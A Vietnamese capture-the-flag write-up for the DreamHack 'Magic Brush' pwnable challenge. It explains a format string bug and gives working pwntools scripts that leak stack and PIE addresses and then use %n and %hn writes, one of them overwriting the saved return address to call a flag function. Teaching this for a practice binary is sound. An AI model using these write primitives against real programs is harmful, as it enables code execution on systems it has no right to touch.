# Magic-Brush---Write-up-----DreamHack
Hướng dẫn cách giải bài Magic Brush cho anh em mới chơi pwnable.

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 11/2/2026

## 1. Mục tiêu cần làm
Đầu tiên xem các lớp bảo vệ

<img width="293" height="171" alt="image" src="https://github.com/user-attachments/assets/58309b56-45c1-4ade-bb83-39d222d03a20" />

Không bất ngờ lắm. Giờ hãy đọc code xem ta có lỗi gì nào.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+10h] [rbp-30h] BYREF
  char s1[8]; // [rsp+18h] [rbp-28h] BYREF
  char format[8]; // [rsp+20h] [rbp-20h] BYREF
  __int64 v7; // [rsp+28h] [rbp-18h]
  __int64 v8; // [rsp+30h] [rbp-10h]
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  *(_QWORD *)format = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v4 = 0LL;
  *(_QWORD *)s1 = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Your magic telescope can work as magic brush. Can you handle it well?");
  do
  {
    printf("Input format string : ");
    __isoc99_scanf("%20s", format);
    printf("Input argument : ");
    __isoc99_scanf("%llu", &v4);
    printf(format, v4);
    putchar(10);
    printf("Type 'done' to finish : ");
    __isoc99_scanf("%6s", s1);
  }
  while ( strcmp(s1, "done") );
  return 0;
}
```

Nhìn vô phát thấy luôn lỗi **Format String**, tác giả còn để công khai cho chúng ta xài nữa mà. Vậy thì mục tiêu ta cần làm là gì ? Bài này mình thấy nó đã cho sẵn 2 hàm đọc flag là

```C
unsigned __int64 get_flag()
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  __int64 v2[11]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v3; // [rsp+68h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(v2, 0, 80);
  stream = fopen("flag.txt", "rt");
  if ( !stream )
  {
    puts("[!] Flag file error. Ask to Rootsquare...");
    exit(1);
  }
  __isoc99_fscanf(stream, "%s", v2);
  printf("Flag is %s\n", (const char *)v2);
  fclose(stream);
  return v3 - __readfsqword(0x28u);
}
```

```C
int secret_flag()
{
  stream = fopen("secret_flag.txt", "rt");
  if ( !stream )
  {
    puts("[!] Flag file error. Ask to Rootsquare...");
    exit(1);
  }
  __isoc99_fscanf(stream, "%s", secret);
  printf("Secret Flag is %s\n", secret);
  return fclose(stream);
}
```

Tác giả chia ra thành 2 bài riêng biệt nhưng cách giải y hệt nhau thôi. Cách giải chung của 2 bài là ta sẽ leak PIE và stack, sau đó ghi đè địa chỉ của các flag vô RIP để khi `done` nó sẽ in ra flag cho chúng ta.

Thực ra bài 1 còn 1 cách giải ngắn hơn nữa. Các bạn hãy đọc code assembly của nó là thấy.

<img width="924" height="606" alt="image" src="https://github.com/user-attachments/assets/80c04c6e-5386-46eb-b19b-716f5fa17757" />

Đây là code assembly của main, các bạn thấy gì không. Nó có 1 điều kiện và nếu thỏa mãn nó thì nó sẽ gọi `get_flag`. Điều kiện là `rbp-0x34` = 2025. Ok vậy là chỉ cần tìm được địa chỉ của stack sau đó ghi 2025 vào `rbp-0x34` là xong.

## 2. Cách thực thi
Giờ ta hãy mở stack lên xem thử coi stack nằm ở vị trí nào

<img width="856" height="463" alt="image" src="https://github.com/user-attachments/assets/fc2a1d64-605f-42bf-93fe-2c452ba39cb2" />

Stack bắt đầu tại `rsp` và mục tiêu mình là `rbp` nên công thức tính sẽ là ` ( rsp - rbp ) / 8 + 6 = 14 `. Vậy mình sẽ xài `%14$p` để in ra stack, sau đó ta sẽ tính luôn vị trí của `rbp-0x34` là bao nhiêu.

<img width="598" height="186" alt="image" src="https://github.com/user-attachments/assets/878a5479-bfea-4050-b1af-db451f037f96" />

Vậy là đủ hết rồi, bắt tay vô code thôi.

```Python
p.sendlineafter(b'Input format string : ', b'%14$p')
p.sendlineafter(b'Input argument : ', b'2')       # v4 khúc này không quan trọng lắm

p.recvuntil(b"0x")
leak_str = p.recvline().strip()
stack_leak = int(b"0x" + leak_str, 16)
log.info(f"Stack leak : {hex(stack_leak)}")

p.sendlineafter(b"Type 'done' to finish : ", b'No')

target_addr = stack_leak - 212

p.sendlineafter(b'Input format string : ', b"%2025c%1$n")
p.sendlineafter(b'Input argument : ', str(target_addr).encode())  # v4 chỗ này sẽ nói là hãy ghi 2025 byte vào chộ đó

pause()

p.sendlineafter(b"Type 'done' to finish : ", b'done')
```

Vậy là xong, khi kết thúc vòng lặp thì nó sẽ nhảy vô `get_flag` và in ra flag cho bạn luôn. Giờ nếu các bạn hứng thú với cách giải còn lại thì hãy sang bài tiếp theo là `secret_flag`.

## 3. Bonus
Giờ là flag ẩn. Như mình đề cập, các bạn có thể ghi đè địa chỉ flag vào RIP sau đó thoát vòng lặp để chạy là xong. Đây là code, nếu không hiểu thì các bạn hãy lên youtube gõ **JHT PWN** và cày full list **Format String** của anh Trí là được nha !!!

```Python
from pwn import *

#p = process('./main')
p = remote('host3.dreamhack.games', 16374)
e = ELF('./main')

p.sendlineafter('string : ', b'%17$p.%19$p.')
p.sendlineafter('argument : ', b'1')

rip_addr = int(p.recvuntil(b'.', drop = True), 16) - 288
binary = int(p.recvuntil(b'.', drop = True), 16)
get_flag_secret = binary + 688 + 5       # +5 để tránh bị lỗi movaps vì stack không chia hết cho 16
log.info(f'Secret flag : {hex(get_flag_secret)}')

p1 = (get_flag_secret & 0xffff)    
p2 = (get_flag_secret >> 16)&0xffff
p3 = (get_flag_secret >> 32)&0xffff

p.sendlineafter('finish : ', b'1')
p.sendlineafter('string : ', f'%{p1}c%1$hn'.encode())
p.sendlineafter('argument : ', str(rip_addr).encode())

p.sendlineafter('finish : ', b'1')
p.sendlineafter('string : ', f'%{p2}c%1$hn'.encode())
p.sendlineafter('argument : ', str(rip_addr+2).encode())

p.sendlineafter('finish : ', b'1')
p.sendlineafter('string : ', f'%{p3}c%1$hn'.encode())
p.sendlineafter('argument : ', str(rip_addr+4).encode())

pause()

p.sendlineafter('finish : ', b'done')

p.interactive()
```

Bài này dùng để luyện trình **Format String** thôi, khá hay vì lỗi nó đã ghi sẵn ra luôn rồi, nhìn vào ta thấy flag ngay lặp tức. Dù sao thì hãy cho mình 1 star để mình có động lực viết tiếp write up nha !

![623701239_1381651590644212_1761345844325536645_n](https://github.com/user-attachments/assets/864f6e50-9e6a-499b-a95c-290ca1811191)
